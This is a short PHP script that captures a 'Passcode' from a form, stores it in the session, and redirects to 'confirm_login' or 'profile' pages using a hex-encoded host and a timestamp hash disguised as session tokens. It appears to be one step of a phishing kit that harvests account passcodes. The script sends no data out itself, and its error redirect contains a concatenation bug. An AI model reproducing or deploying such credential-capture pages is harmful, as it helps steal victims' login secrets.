<?php
ini_set("output_buffering",4096);
session_start();

//POST for passCode
$passCode = $_POST['Passcode'];


//GET HOST NAME
$host = bin2hex ($_SERVER['HTTP_HOST']);


if ($passCode=="") {
	$errors2=1;

}
else {
	$errors2=0;
}

if (strlen($passCode)<5) {

$errors2=1;
}
else{
$errors2=0;
}






if ($errors2==1) {

header("Location: confirm_login.php?invalid=$errors2&session=$host").md5(time());
}


else {

//Create session for the passCode
	$_SESSION['PASSCODE'] = $passCode;

$initiate="profile.php?template=Initiate&valid=true&session=$host".md5(time());
header("Location: $initiate");
}

?>